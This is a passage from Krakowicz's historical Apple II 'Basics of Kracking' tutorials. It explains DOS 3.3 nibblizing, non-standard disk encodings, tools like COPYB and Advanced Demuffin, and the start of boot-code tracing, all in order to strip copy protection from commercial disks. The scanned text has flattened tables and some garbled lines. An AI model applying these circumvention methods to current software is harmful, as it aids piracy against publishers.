BIT BYTES IS CALLED  NIBBLIZING .  WE CAN BEGIN TO SIMULATE THE  PRENIBBLIZING  PROCESS BY MAKING UP TWO TABLES.  THE FIRST ONE, WHICH NORMALLY RESIDES AT  BB00 BBFF, IS SET UP TO CONTAIN THE FIRST SIX BITS OF EACH OF THE 256 BYTES     IF THE      THE CORRESPONDING ORIGINAL BYTE  ENTRY IN THE BB00  ALUE WAS    TABLE IS        TABLE   HEX   BINARY    HEX   BINARY    ADDR  00   0000 0000    00 0000 0000  BB00  3F   0011 1111    3F 0011 1111  BB01  47   0100 0111    07 0000 0111  BB02  69   0110 1001    29 0010 1001  BB03  7F   0111 1111    3F 0011 1111  BB04  85   1000 0101    05 0000 0101  BB05  BC   1011 1100    3C 0011 1100  BB06  F0   1111 0000    30 0011 0000  BB07  FF   1111 1111    3F 0011 1111  BB08      !    !     !      !    !     !      V    V     V     AS YOU CAN SEE, IN EACH CASE THE FIRST TWO BITS HAVE BEEN CHOPPED OFF AND REPLACED WITH ZEROES.  THE RESULTING BYTE, NOW BETWEEN 0 AND  3F  0 AND 63  CAN BE RELATED, ONE FOR ONE, TO THE WRITEABLE BYTES.  HOWEVER, IF WE DON'T STORE, IN SOME ORGANIZIED FASHION, THOSE TWO BITS WE LOPPED OFF EVERY BYTE, WE WON'T BE ABLE TO RECONSTRUCT THE ORIGINAL BYTES WHEN WE READ THESE FUNNY LITTLE 6 BIT NIBBLEBYTES FROM THE TRACK.  THE WAY THAT'S DONE IS TO CONTRUCT A SECOND TABLE, NORMALLY AT BC00 BC55, WHICH CONTAINS ALL THE LITTLE BITS AND PIECES  HO HO HO  LEFT OVER AFTER THE TRUNCATION OF THE ORIGINAL BYTES TO SIX BITS.  IN THE EXAMPLE LIST GIVEN ABOVE, THE LEFTOVERS ARE           00                             00                              01                               01                01                  10                    10     !  !   !        11     !  !   !        11     !  !   !       !  !   ! THIS SECOND LIST WORKS    !  !   ! FROM THE BOTTOM UP, SO    !  !   ! THE CONTENTS WOULD BE     !  !   !       !  !   !             !  !   !  ! !   !    !  !   !  ! !   !    !  !   !       BC4D    00XX YY11    !  !   !       BC4E    00XX YY11    !  !   !       BC4F    00XX YY10    !  !   !       BC50    00XX YY10    !  !   !       BC51    00XX YY01    !  !          BC52    00XX YY01                BC53    00XX YY01                BC54    00XX YY00               BC55    00XX YY00            SO, THE FIRST TWO BITS OF THE ORIGINAL BYTE BECOME THE LAST TWO BITS OF THE BYTES IN THIS TABLE, WORKING FROM THE BOTTOM UP.  AFTER  56  86 DECIMAL  BYTES HAVE HAD THEIR FIRST TWO BITS STUFFED INTO THE TABLE, THE NEXT ONE REPLACES THE  YY  AT LOCATION BC55, THEN AT BC54, ETC.  AFTER  AC  172  BYTES, THE NEXT PAIR OF LEFTOVERS GOES INTO THE  XX  SLOT OF LOCATION BC55, AND WORKS UP AGAIN UNTIL THE LAST TWO BITS ARE STUFFED INTO THE  XX  SLOT OF LOCATION BC00.  REMEMBER THAT THE TWO MOST SIGNIFICANT BITS MUST ALWAYS BE ZERO TO STAY WITHIN THE 0 3F RESTRICTION.    AFTER THESE TWO TABLES HAVE BEEN CONSTRUCTED, EACH VALUE IN THE TABLE IS EXCLUSIVE ORED ON WITH THOSE THAT WENT BEFORE, TO FORM A NEW SIX BIT BYTE.  THE RESULTING VALUE, WHICH IS STILL BETWEEN 0 AND  3F, IS TRANSLATED TO ONE OF THE 64 BYTES WHICH OBEY ALL THE LAWS LISTED ABOVE FOR THE DISK BYTES, AND THEN REALLY AND TRULY WRITTEN TO DISK.  THE TABLE WHICH DOES THIS CONVERSION IS CALLED THE  WRITE TRANSLATE TABLE  AND LIVES AT  BA29 TO  BA68.  IN OUR EXAMPLE, THEN THE PROCESS GOES LIKE THIS      1.  GET A BYTE FROM BB00  00   2.  EXCLUSIVE OR IT WITH 00  IT'S THE FIRST BYTE  00 EOR 00 00   3.  LOOK UP THE BYTE AT  BA29   0  96   4.  WRITE IT TO DISK.      THE NEXT BYTE                  1.  GET THE BYTE FROM BB01  3F   2.  EXCLUSIVE OR IT WITH THE PREVIOUS VALUE OF 00 3F EOR 00 3F   3.  LOOK UP THE BYTE AT  BA29    3F FF   4.  WRITE IT TO DISK      AND THE THIRD BYTE            1.  GET THE BYTE FROM BB02  07   2.  EXCLUSIVE OR IT WITH THE PREVIOUS VALUE OF 3F 07 EOR 3F 34   3.  LOOK UP THE BYTE AT  BA29    34 F3   4.  WRITE IT TO DISK       FOURTH AND LAST EXAMPLE        1.  GET THE BYTE FROM BB03  29   2.  EXCLUSIVE OR IT WITH THE PREVIOUS VALUE OF 34 29 EOR 34 1D   3.  LOOK UP THE BYTE AT  BA29    1D CE   4.  WRITE IT TO DISK     AND SO ON UNTIL THE TOTAL OF  156 OR 342 BYTES FROM THE TWO TABLES IS WRITTEN TO DISK.   LOOKING AT THIS PROCESS, YOU CAN SEE THAT A SECTOR WITH ALL ZEROES WOULD NEVER CHANGE THE FIRST BYTE WRITTEN OUT, AND WOULD DISPLAY A SECTOR FULL OF 96'S ON A NIBBLE READ .    WHEN THE DATA FIELD OF A SECTOR IS READ BACK IN, THE PROCESS IS REVERSED. AFTER ALL 342 BYTES ARE READ INTO BB00 BC55, EACH BYTE IS EXCLUSIVE ORED OFF THE PILE, AND THE RESULT IS USED TO LOOK UP A VALUE OF 0 3F IN A  READ TRANSLATE TABLE  AT BA96 BAFF.  THROUGH SOME ELEGANT, IF INTRICATE CODE, THIS 6 BIT  BYTE  IS RECOMBINED WITH ITS LONG LOST 2 BITS, AND THE FINAL, REAL BYTE IS STORED WHERE  3E AND  3F ARE POINTING.    IN THE FEW REMAINING LINES, LET ME EXPOUND FOR A MOMENT ON THE EXCLUSIVE  OR OPERATOR.  THE INSTRUCTION EOR  WHICH USES THE MNEMONIC XOR IN EVERY OTHER ASSEMBLY LANGUAGE  WORKS LIKE THIS   FOR EACH BIT OF THE TWO BYTES TO BE OPERATED ON, THE OUTPUT IS A ONE IF ONE AND ONLY ONE OF THE BITS IS ONE, BUT A ZERO IF BOTH ARE ZERO OR ONE.  THE TRUTH TABLE BELOW SUMMARIZES    INPUT 1  INPUT 2   OUTPUT    0     0      0    0     1      1    1     0      1    1     1      0  AND THE LAST EXAMPLE GIVEN ABOVE IS       0010 1001   29      EOR   0011 0100   34                  0001 1101   1D      THIS IS BASICALLY A NEAT LITTLE OPERATOR WHICH HAS BEEN FREQUENTLY PERVERTED BY THE ENEMY TO DO THEIR DIRTY WORK.  MORE ON THIS LATER  STAY TUNED FOR THE NEXT EPISODE    NON STANDARD ENCODING SCHEMES.                                                                                                                   KRAKOWICZ'S KRACKING KORNER                          THE BASICS OF KRACKING 107                          BEYOND DEMUFFIN NON STANDARD              DISK ENCODING TECHNIQUES            AND DISKBIT TIDBITS                                                                                RECENTLY, WE HAVE DISCUSSED THE UNPROTECTION OF DISKS WITH A MODIFIED DOS, PRIMARILY THROUGH THE USE OF DEMUFFIN PLUS.  THIS TIME WE'LL TALK A LITTLE ABOUT SOME OTHER APPROACHES TO CONVERTING MODIFIED DOS DISKS, THEN GET INTO SOME SLIGHTLY HEAVIER STUFF ABOUT THOSE PROTECTION TECHNIQUES WHICH GO WAY BEYOND MODIFYING DOS.    IN ADDITION TO DEMUFFIN PLUS, TWO PROGRAMS HAVE RECENTLY BECOME AVAILABLE FOR UNPROTECTING A DISK WITH MODIFIED DOS  COPYB AND ADVANCED DEMUFFIN.  SINCE, AS WE DISCUSSED EARLIER, MOST MODS ARE MADE TO THE RWTS PORTIONS OF DOS, ALL THAT'S REALLY NECESSARY TO REMOVE THE PRIMARY PROTECTION IS TO READ THE DISK INTO MEMORY USING ITS OWN RWTS, THEN SWITCH IN A NORMAL RWTS AND WRITE IT BACK OUT TO ANOTHER DISK.  SINCE THE FILE MANAGER IS NOT INVOKED AS IT IS IN DEMUFFIN PLUS, THIS APPROACH HAS THE ADDED ADVANTAGE THAT A DISK WITH FAIRLY NORMAL SECTOR STRUCTURE BUT NO DOS FILE STRUCTURE OR CATALOG CAN STILL BE CONVERTED. IN THE EARLY DAYS, THE TECHNIQUE WAS THIS   STORE BOTH RWTS'S IN MEMORY, THEN USE THE INSPECTOR TO READ IN ABOUT 8 TRACKS.  MOVE THE NORMAL RWTS IN WITH THE MONITOR, THEN WRITE OUT THE TRACKS TO AN INITIALIZED DISK.  ABOUT 5 TIMES AROUND MAKES A COPYA DISK AND JACK A DULL BOY.  FORTUNATELY, THINGS HAVE IMPROVED.    COPYB IS A MODIFICATION OF COPYA WHICH AUTOMATICALLY SWAPS THE RWTS ROUTINES FOR YOU.  TO RUN IT, YOU BOOT THE PROTECTED PROGRAM AND INTERRUPT IT, THEN MOVE THE RWTS ROUTINES FROM  B700 TO  8000  YOU CAN ALSO USE THE READ IN TECHNIQUE DESCRIBED IN BASICS 105 TO PUT THE MODIFIED RWTS INTO MEMORY, AND YOU CAN KEEP A LIBRARY OF RWTS'S IF YOU FIND PEOPLE LIKE MUSE AND SSI USING A PARTICULAR ONE OVER AND OVER. THESE CAN SIMPLY BE LOADED AS BFILES INTO  8000 AFTER BOOTING COPYB .  BOOTING COPYB AND ANSWERING ONE CRYPTIC AND FOUR FIDDISH QUESTIONS ALLOWS YOU TO PRODUCE A COPYA DISK, INCLUDING AUTOMATIC INITIALIZATION OF THE TARGET DISK.  REASONABLY COMPLETE INSTRUCTIONS, WRITTEN BY THE AUTHOR WHO HAS ACHIEVED NATIONAL PROMINENCE FOR VERBAL DIARRHEA, ACCOMPANY THE PROGRAM, SO WE WON'T BELABOR THEM HERE.    A MUCH MORE COMPLETE PROGRAM CALLED ADVANCED DEMUFFIN HAS RECENTLY ISSUED FROM CORRUPT COMPUTING, UNDER THE ABLE AUTHORSHIP OF  THE STACK  AND  THE INSPECTOR . IT ALSO MAKES UNPROTECTED COPIES VIA RWTS SWAPS, BUT IS MUCH MORE USER FRIENDLY AND VERSATILE. THOROUGH SOFTDOC ACCOMPANIES THAT PROGRAM AS WELL, SO WE NEEDN'T DWELL ON IT, EXCEPT TO CONGRATULATE THE AUTHORS ON AN EXCELLENT AND HIGHLY PROFESSIONAL CONTRIBUTION TO THE ART OF UNPROTECTION.     EXCEPT FOR SOME CLEVER AND WELL HIDDEN SECONDARY PROTECTION, THERE IS NOT MUCH THAT A PROTECTOR CAN DO THESE DAYS WITH A MODIFIED DOS THAT WE CAN'T UNDO IN SHORT ORDER WITH THE TOOLS AND TECHNIQUES AVAILABLE TO US.  WHY ARE THERE STILL SOME PROGRAMS THAT TAKE A LONG TIME TO KRACK   MORE EXTENSIVE MODIFICATIONS, EXTENDING EVEN TO COMPLETE CUSTOM DOS'S.  HERE, HOWEVER, WE START TO SEPARATE THE MEN FROM THE BOYS, SINCE WRITING YOUR OWN OPERATING SYSTEM, NO MATTER HOW LIMITED, COSTS MONEY.  WHILE DOS MODIFICATIONS, EVEN WITH SEVERAL VARIATIONS, CAN BE WHIPPED OUT IN A FEW MINUTES BY ANY KLUTZY HACKER, READING AND WRITING IN WAYS NOT SANCTIONED BY THE GODS OF APPLEDOS REQUIRE HIRING SOMEONE WHO KNOWS HIS SHIT, AND HE ALSO USUALLY KNOWS HOW MUCH HE'S WORTH.  THIS HAS ADVANTAGES FOR US AS WELL, SINCE PUBLISHERS WILL TRY TO GET THEIR MONEY'S WORTH OUT OF AN EXPENSIVE SYSTEM BY USING IT ON AS MANY PRODUCTS AS POSSIBLE.  ONCE BROKEN, THE PRICIPLES CAN BE READILY APPLIED TO ALL DISKS OF THE SAME GENERATION OF PROTECTION.    IF A PUBLISHER IS GOING TO GO BEYOND MODIFYING DOS, HE WILL NORMALLY ALSO ABANDON STANDARD TRACK AND SECTOR FORMAT FOR SOMETHING WHICH AFFORDS GREATER SECURITY AND EASE OF USE  SOMETIMES, SINCE THE APPLE DISK HARDWARE IF SO FLEXIBLE, FORMATS WHICH WERE BORN ON ENTIRELY DIFFERENT SYSTEMS FIND THEIR WAY INTO APPLE PROTECTION SCHEMES .  GAMES, ESPECIALLY, HAVE MUCH SIMPLER STRUCTURE, AND ARE READILY ADAPTED TO A FORMAT WITH LESS COMPLEXITY.  SINCE SPACE ON A GAME DISK IS USUALLY NOT AT A PREMIUM, A VERY COMMON SIMPLIFICATION IS TO ELIMINATE SECTORING ALTOGETHER, AND MAKE EACH TRACK ONE BIG SECTOR.  THIS NOT ONLY SIMPLIFIES THE PROGRAM THAT HAS TO READ THE DISK, BUT CAN ALSO DRAMATICALLY INCREASE THE DATA TRANSFER RATE  SIRIUS'S HADRON BROUGHT IN A FULL 48K IN JUST OVER FOUR SECONDS  EAT YOUR HEART OUT, DOS .  BEFORE WE DISCUSS SOME OF THE FORMATS USED, WE HAVE TO TAKE A MUCH CLOSER LOOK AT THE WAY INFORMATION IS ACTUALLY READ FROM A DISK.    THERE ARE A FEW ABSOLUTE LAWS OF DISK WRITING AND READING WHICH MUST BE OBSERVED, AND SEVERAL MINOR STATUTES WHICH MAY BE VIOLATED WITH ONLY A SUMMONS. THE REAL, DEEP DOWN, TRUE WAY THAT DATA IS RECORDED ON ANY DISK IS BY WAY OF  MAGNETIC FLUX CHANGES , THAT IS, REVERSALS IN THE DIRECTION OF MAGNETIZATION OF A THIN COATING OF IRON OXIDE ON THE DISK SURFACE.  WE ALL RECALL FONDLY THE SCIENCE EXPERIMENTS WITH IRON FILINGS AND A BAR MAGNET  DISK RECORDING TECHNOLOGY IS BASED ON MAKING THE PARTICLES VERY SMALL, AND IMMOBILIZING THEM ON THE DISK SO THEY CAN BE EXAMINED LATER FOR THE STATE OF THEIR MAGNETIZATION. DISKETTE READING IS ACTUALLY A  GASP!  ANALOG PROCESS, AND IS MADE DIGITAL BY SOME CLEVER CIRCUITRY JUST DOWNSTREAM OF THE READ HEAD.  THIS CIRCUITRY SENSES THE MAGNETIC FIELD OVER A PRECISELY DEFINED TIME INTERVAL, AND TRANSLATES A  CHANGE   REVERSAL  IN THE DIRECTION OF MAGNETIZATION TO A DIGITAL  ONE , AND INTERPRETS  NO CHANGE , OR THE ABSENCE OF REVERSAL, AS A  ZERO .     NIBBLE   IN CASE YOU WERE CURIOUS, THE DISK SPINS AT 300 RPM WHICH IS 5 REVOLUTIONS PER SECOND, OR 200 MILLISECONDS  MSEC  PER ROTATION.  SINCE 8 BITS   ONE BYTE, A BYTE IS READ EVERY 32 USEC, OR 0.032 MSEC, AND EACH REVOLUTION OF THE DISK CORRESPONDS TO 200 MSEC 0.032 MSEC OR ABOUT 6000 BYTES.  THIS IS ROUGHLY  1800 BYTES PER TRACK, WHICH IS ABOUT THE NUMBER OF BYTES YOU NORMALLY SEE DISPLAYED DURING A NIBBLE COUNT WITH NIBBLES AWAY OR LOCKSMITH .    IT'S NOT TOO BAD A PHYSICAL PICTURE TO REPRESENT THE ORIENTATION OF THE MAGNETIC FIELDS WITH ARROWS  UP AND DOWN ARROWS WOULD BE NICER, BUT THE APPLE SCREEN NO GOTS .  IN THE DIAGRAM BELOW, THE ORIENTATION OF MAGNETIC  DOMAINS  ON THE DISK FOR 9 BITS ARE REPRESENTED    READ PT     1  2  3  4 5  6  7  8  9 DIR'N                                                                   BIT VALUE   0  1  1  0 0  1  0  1  0     NOTICE THAT EACH TIME THE MAGNETIC FIELD REVERSES DURING THE READ INTERVAL, THE BIT VALUE IS READ AS  1 , AND AS  0  WITH NO REVERSAL.    THE DISK ANALOG CARD AND CONTROLLER CARD COOPERATE TO STACK UP THIS  SERIAL BIT STREAM  INTO AN 8 BIT BYTE, USING A SHIFT REGISTER WHICH IS THE HARDWARE EQUIVALENT OF THE  ASL  OR  ARITHMETIC SHIFT LEFT  INSTRUCTION IN APPLE ASSEMBLY LANGUAGE.  THE SHIFT REGISTER STARTS OUT FULL OF ZEROES, AND KEEPS SCHLEPPING IN, FROM THE LEFT, THE NEW BIT READ FROM THE DISK EVERY 4 MICROSECONDS.  THE SEQUENCE BELOW REPRESENTS THE SHIFT REGISTER CONTENTS AT EACH OF THE READ POINTS SHOWN IN THE ARROW CHART ABOVE    SHIFT        NEXT BIT REGISTER        TO BE BIT        7 6 5 4 3 2 1 0     ADDED                           OF   !    !

NOTICE THAT THE MOST SIGNIFICANT BIT   MSB , OR BIT 7  OF THE SHIFT REGISTER STAYS AT  0  UNTIL THE NINTH SHIFT, WHEN A  1  IS SHIFTED IN.  THIS IS THE SIGNAL WE USE TO DECIDE WHEN WE SHOULD STOP READING AND SHIFTING, AND CALL IT A BYTE.  THE SHIFT REGISTER IS DECODED AS ADDRESS  C0EC  FOR SLOT SIX , AND THE FAMILIAR INSTRUCTION SEQUENCE      B954  LDA  C08C,X  X 60 FOR SLOT 6    BPL  B954    IS USED AS A  WAIT AND WATCH  LOOP TO DETECT WHEN THE MSB HAS FINALLY BECOME A ONE.  IF YOU ARE STILL FOLLOWING THE DISCUSSION, YOU SHOULD NOW BE ABLE TO SEE THE REASON FOR THE FIRST LAW OF DISK BYTES  LISTED IN BASICS 106    IF THE FIRST BIT OF THE BYTE WEREN'T A ONE, BIT 7 OF THE SHIFT REGISTER WOULD STILL HAVE A ZERO WHEN WE SHOULD BE AT THE END, AND WE WOULD SHIFT AT LEAST ONE MORE TIME, LOOKING IN VAIN FOR A  1 .  THE SECOND  NOT MORE THAT ONE PAIR OF ADJACENT ZEROES  IS REQUIRED TO KEEP THE CIRCUITRY FROM GETTING LOST  THE THIRD LAW, WHICH REQUIRES AT LEAST ONE PAIR OF ADJACENT ONES NOT INVOLVING BIT 7, IS ONLY FOR DOS 3.3, AND DOES NOT AFFECT THE HARDWARE .  LET'S LOOK, FOR REVIEW, AT SOME LEGAL AND ILLEGAL NIBBLES     BYTE  BINARY      LEGAL  VIOLATION                                         7F  0111 1111        NO    RULE 1   8F  1000 1111        NO    RULE 2   92  1001 0010        NO    RULE 2   95  1001 0101       YES   NOT DOS 3.3   96  1001 0110       YES     NONE   97  1001 0111       YES     NONE   98  1001 1000        NO    RULE 2   9A  1001 1010       YES   NOT DOS 3.3   9B  1001 1011       YES     NONE   D5  1101 0101       YES          AA  1010 1010       YES            THESE TWO BYTES ARE NOT ALLOWED IN THE DOS 3.3 NIBBLIZING SCHEME, BUT ARE USED IN PROLOGS AND EPILOGS.    ALSO, TUCK THIS AWAY IN THE BACK OF YOUR MIND    N0  LEGAL DISKBYTES CAN CONTAIN 8, 1, OR 0.    NOW, IF YOU WANT TO CREATE A NON STANDARD DISK FORMAT TO KEEP THOSE NASTY PIRATES OUT OF YOUR  UNKRACKABLE  SOFTWARE, ALL YOU HAVE TO DO IS PICK A SELECTION OF LEGAL BYTES  AND MAYBE A FEW OF THE ILLEGAL ONES , AND ARRANGE YOUR OWN ENCODING SCHEME.  THE MOST COMMON TECHNIQUE IS AN ADAPTATION OF THE OLD ENCODING SCHEME CALLED 4 4 NIBBLIZING INTRODUCED TO DISK PROTECTION  I BELIEVE  BY MY GOOD FRIENDS AT SIRIUS SOFTWARE. THIS IS THE SAME SYSTEM APPLE USES TO STORE VOLUME, TRACK AND SECTOR DATA IN THE ADDRESS FIELD  SEE BASICS 104 .  AS WE DESCRIBED, EACH REAL BYTE IS SPLIT INTO ODD AND EVEN HALVES, AND ENCODED SO THAT EACH BYTE STORED ON THE DISK REPRESENTS EXACTLY 4 BITS, OR ONE NIBBLE, OF THE ORIGINAL BYTE  THE BEGINNING OF THE DISKNIBBLEBYTE CONFUSION .  THE CHOICE FOR THESE IS LIMITED   ALL DISK BYTES ARE MADE UP OF A,B,E AND F, SO YOU CAN HAVE,ON THE DISK          AA AB AE AF BB BA BE BF       EA EB EE EF FA FB FE FF    YOU CAN FIND  PERHAPS TOO MUCH  MORE INFORMATION ON THIS TECHNIQUE AND DECODING IT IN THE FILES ON CYCLOD, WAY OUT, AND TYPE ATTACK.    IN GENERAL, WHILE THE APPROACH TO UNPROTECTING ALL OF THESE ODDBALL FORMATS IS STRAIGHTFORWARD, THE WORK CAN BE LONG AND HARD, AND CAN PROVIDE SOME REAL CHALLENGE TO OUR SKILL AS KRACKISTS AND PROGRAMMERS.  IN BROAD OUTLINE     A.  TRY TO FIGURE OUT THE DISK ACCESS LOGIC AND ISOLATE THE READER LOADER CODE.    B.  MODIFY IT TO READ IN ALL THE PERTINENT PARTS OF THE DISK.    C.  SAVE THE PIECES OUT TO DISK UNDER NORMAL RWTS STRUCTURE.9    D.  RECONSTRUCT THE PROGRAM, USING AS LITTLE NEW CODE AS POSSIBLE.     BY NOW YOU SHOULD KNOW WHAT A LOADER ROUTINE LOOKS LIKE, AND IN MOST CASES THESE DISKS WILL LOAD A COMPLETE TRACK AT A TIME INTO A PREDETERMINED AREA OF MEMORY.  BY LOCATING AND ALTERING THE TABLE OF  WHERE TO READ IN , YOU CAN, IN A FEW PASSES, READ THE TRACK INTO MEMORY, BOOT A DISK, AND WRITE THE MEMORY CONTENTS OUT UNDER THE NORMAL DOS FORMAT.  AFTER ALL THE INFORMATION IS SAVED, YOU CAN BEGIN THE PROCESS OF RECONSTRUCTION.  USUALLY, THIS CONSISTS OF LOADING DOS  OR AT LEAST RWTS  INTO MEMORY AND USING IT TO MANIPULATE SECTIONS OF THE ORIGINAL CODE. IN CASES LIKE CYCLOD, THE ADDITIONAL DISK ACCESS BETWEEN LEVELS IS TOTALLY UNNECESSARY AND CAN BE ELIMINATED.  IN SOMETHING LIKE BANDITS, HOWEVER, A GREAT DEAL OF REAL DATA IS READ IN AT EACH LEVEL, AND A MEANS MUST BE FOUND TO ACCOMMODATE THE DISK ACCESS.  USUALLY, THIS MEANS TRYING TO SQUEEZE THE ABSOLUTELY CRUCIAL SUBROUTINES FROM RWTS INTO THE SPACE ORIGINALLY OCCUPIED BY THE LOADER ROUTINE.    THERE ARE A NUMBER OF THESE  SHORT DOS  ROUTINES IN EXISTENCE.  THESE PROGRAMS ARE ALL LESS THAN  400 BYTES LONG, AND INCLUDE TRACK SEEK, ADDRESS AND DATA FIELD READERS, AND POSTNIBBLIZING ROUTINES.  IN THE PROCESS OF KRACKING BANDITS, BOTH THE SHY  NAMELESS  KRACKER   THEY SAID IT COULDN'T BE DONE...   AND I WROTE VIRTUALLY IDENTICAL ROUTINES WHICH LIVED IN TEXT MEMORY AT 400 7FF.  LONG  JOHN SILVER HAS HIS OWN VERSION OF A SHORT DOS, AND AN EXCELLENT IMPLEMENTATION HAS RECENTLY BEEN INTRODUCED BY THE STACK AND THE INSPECTOR OF  CORRUPT COMPUTING . IT IS EXTREMELY WELL DOCUMENTED, AND JUST AS IN THE CASE OF ADVANCED DEMUFFIN, THE BEST UTILITY AVAILABLE TO THE PRACTICING KRACKIST.    THAT'S A CRUDE OUTLINE OF THE DISK PROTECTION SCHEMES WHICH GO BEYOND MODIFIED DOS  UNFORTUNATELY, MOST ARE QUITE DIFFERENT IN DETAIL, AND YOUR SKILL AS A KRACKIST MUST BE MADE EQUAL TO THE TASK OF EACH ONE.  WE'LL CONTINUE THE BASICS OF KRACKING SERIES NEXT TIME WITH THE LONG PROMISED ARTICLE ON BOOT  TRACING.                                                                                                                  KRAKOWICZ'S KRACKING KORNER                                       THE BASICS OF KRACKING 108                            BOOT CODE TRACING PART 1                                                                                            AT LAST!  THE LONG AWAITED DESCRIPTION OF BOOT CODE TRACING AND ITS APPLICATION TO DISK UNPROTECTION.  OY KRACKING LAW  7 SAYS  WHEN ALL ELSE FAILS, BOOT TRACE.  FOR MANY KRACKISTS, NOTABLE AMONG WHOM WAS MR.  XEROX  MAY HE REST IN PEACE , THE MOTTO WAS OPPOSITE    BEFORE YOU DO ANYTHING ELSE, TRACE THE BOOT CODE.  DEPENDING ON YOUR SKILL AND PREDISPOSITION, YOU'LL SETTLE SOMEWHERE IN BETWEEN THESE EXTREMES.    IF MR.  XEROX DIDN'T INVENT BOOT  TREACING HE WAS CERTAINLY THE FIRST TO DOCUMENT IT CLEARLY IN THE UNDERGROUND PRESS.  THE DESCRIPTION THAT FOLLOWS BORROWS HEAVILY FROM HIS ORIGINAL TREATISE ON THE PIRATE'S HARBOR CRACKING DISO  1.  IN ADDMTION,  MYCROFT  WROTE A THOROUGH ARTICLE IN HARDCORE COMPUTING UPDATE 3.1 DESCRIBING HIS OWN, SLIGHTLY DIFFERENT APPROACH TO BOOT TRACING. WHILE I FIND HIS PROCESS A LITTLE MORE LABORIOUS, IT MIGHT BE NECESSARY FOR SOME VERY DIFFICULT CASES.    THE PROCESS IS BASED FIRMLY ON THE FRIST LAW   TRACK 0, SECTOR 0 OF EVGRY DISK MUST  ALWAYS  LOAD INTO PAGE 8   800 8FF .  THE FURTHER ASSUMPTION IS THAT, IF WE CAN VIEW EVERY STAGE OF THE BOOT PROCESS, WE CAN LEARN ENOUGH TO PRODUCE AN UNPROTECTED VGRSION OF THE PROGRAM.  IT DOES NOT HAVE MYSTICAL POWERS, AND STILL REQUIRES THE ABILITY TO TEAR APART AND UNDERSTAND ASSEMBLY LANGUAGE, MUCH OF WHICH IS INTENTIONALLY MISLEADING.  WE'LL BEGIN WITH BACKGROUND MATERIAL AND A REVIEW OF THE NORMAL BOOT PROCESS  DAMMIT, MAUDE, WE ALWAYS HAVE TO SIT THROUGH THE SERMON FIRST! , AND PROCEED THROUGH AN EXAMPLE OF A NEW PROGRAM.     AS WITH MOST KRACKING ACTIVITIES, INITIALLIZED DISK FOR SAVING PIECES OF THE CODE AS THEY BECOME AVAILABLE .    ORDINARILY, WHEN YOU BOOT A 48K SLAVE DISK  A MASTER IS SLIGHTLY DIFFERENT, BUT WE'LL IGNORE THAT FOR THE TIME BEING , A THREE STAGE PROCESS IS STARTED WHICH ENDS UP WITH THE DESIRED  HELLO  PROGRAM RUNNING.  FIRST, THE CONTROLLER CARD ROM AT  C600 C6FF LOADS T0, S0 INTO PAGE 8, THEN JUMPS TO LOCATION  801. THIS IS A SHORT PROGRAM THAT LOADS ALL 10 SECTORS OF RWTS FROM T0, S0 THROUGH T0,S9 INTO PAGES  B6 BF   B600 BFFF , THEN JUMPS TO LOCATION  B700.  THIS PROGRAM, IN TURN, LOADS  1B  27  PAGES INTO  9D00 B5FF FROM T2, S4 THROUGH T0, SB  NOTE THIS IS A  BACKWARDS LOAD  FOR SPEED.  APPLE KNEW ABOUT IT, SO WHY DIDN'T DOS EVER USE IT FOR QUICKLOADING FILES    .  AFTER A LITTLE HOUSEKEEPING, THE PROGRAM JUMPS TO THE DOS COLDSTART IN  9D84, WHICH RUNS OR EXECS THE HELLO PROGRAM.  IN SUMMARY     CODE     OF  DEST  NAME NEXT LOCATION  SECT.  PAGE  JUMP                                     C600 C6FF    1   08   STAGE 0  801 0801 08FF    9 B6 BF  STAGE 1 B700 B700 B7FF   27 9D B5  STAGE 2 9D84     OF COURSE, IN A NONSTANDARD FORMAT INTENDED FOR PROTECTION, THINGS AREN'T NECESSARILY THE SAME.  TO SEE THE DIFFERENCES, YOU NEED TO EXAMINE EACH STAGE SEPARATELY TO SEE WHAT IT DOES AND WHERE IT GOES.    THE THEORY OF BOOT TRACING IS STRAIGHTFORWARD   FOLLOW THE BOOT PROCESS ONE STEP AT A TIME TO SEE WHERE IS LEADS YOU, BY CREATIVELY ALTERING THE THE CODE TO PREVENT IT FROM RUNNING AWAY FROM YOU. IN SUMMARY, WE WILL     1.  READ IN THE STAGE 1 BOOT CODE, BUT NOT ALLOW IT TO EXECUTE,    2.  ALTER THE FIRST STAGE BOOT SO IT WILL EXECUTE TO LOAD IN STAGE TWO, WHILE       PREVENTING THE NEW STAGE FROM RUNNING,    3.  IF NECESSARY, REPEAT THE PROCESS OF ALTERING, LOADING, AND HALTING UNTIL       ALL THE STAGES OF THE BOOT HAVE BEEN EXAMINED AND UNDERSTOOD.    IN PRACTICE, THE FIRST TWO STEPS ARE RELATIVELY STANDARD, BUT STEP THREE CAN GET QUITE INVOLVED AS THE TRACE PROGRESSES.    THE TECHNIQUE FOR INTERRUPTING THE ORDERLY FLOW OF THE BOOT IS REFERRED TO AS  SETTING BREAK POINTS .  THE TERMINOLOGY IS BORROWED FROM THE DARK AGES WHEN COMPUTERS HAD REAL FRONT PANELS WITH KNOBS AND SWITCHES AND LIGHTS, AND YOU COULD ACTUALLY  DIAL IN  AN ADDRESS WHERE YOU WANTED THE COMPUTER TO HALT FOR EXAMINATION  IS ANYONE OUT THERE OLD ENOUGH TO SHARE MY FOND RECOLLECTION OF 'EXECUTE STOP' AND 'FETCH STOP' KNOBS  .  SOPHISTICATED SYSTEMS WITH HIGH LEVEL EXECUTIVE PROGRAMS STILL ALLOW THIS TODAY, BUT IN THE APPLE WE HAVE TO BE A LITLE MORE IMAGINATIVE.    IN ALL APPLE II SYSTEMS, THE INSTRUCTION SEQUENCE '4C 59 FF' OR JMP FF59 GOES TO THE RESET CODE AND PROVIDES A POSITIVE, PERMANENT STOPPING PLACE FROM ANYPLACE IN ASSEMBLY LANGUAGE CODE, AND HALTS WITH A WELL DEFINED MACHINE STATE. WHENEVER WE WANT TO SET A  BREAKPOINT  IN THE APPLE, WE CAN REPLACE ANY THREE BYTES OF CODE WITH '4C 59 FF'.    TO BEGIN THE PROCESS, LETS LOOK AT SOME CODE FROM PART OF THE CONTROLLER CARD BOOT ROM     C600  A2 20     LDX   20 C602  A0 00     LDY     00 C604  A2 03     LDX     03     !     !

